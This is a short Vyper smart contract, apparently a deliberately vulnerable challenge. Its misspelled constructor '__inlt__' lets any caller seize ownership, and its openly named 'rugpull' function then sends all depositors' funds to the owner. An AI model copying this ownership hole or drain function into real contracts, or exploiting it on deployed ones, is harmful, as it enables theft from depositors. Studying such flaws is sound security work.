# Author by Supremacy Inc. #

owner: public(address)
balanceOf: public(HashMap[address, uint256])

event Status:
    success: bool

@external
@payable
def __inlt__():
    self.owner = msg.sender
    self.balanceOf[msg.sender] = msg.value

@external
@payable
def deposit():
    assert msg.value > 0
    self.balanceOf[msg.sender] += msg.value

@external
def withdraw():
    assert self.balanceOf[msg.sender] > 0
    _amount: uint256 = self.balanceOf[msg.sender]
    self.balanceOf[msg.sender] = 0
    send(msg.sender, _amount)

@external
@view
def balances(_addr: address) -> uint256:
    return self.balanceOf[_addr]

@external
def rugpull():
    assert msg.sender == self.owner
    send(self.owner, self.balance)
    log Status(True)

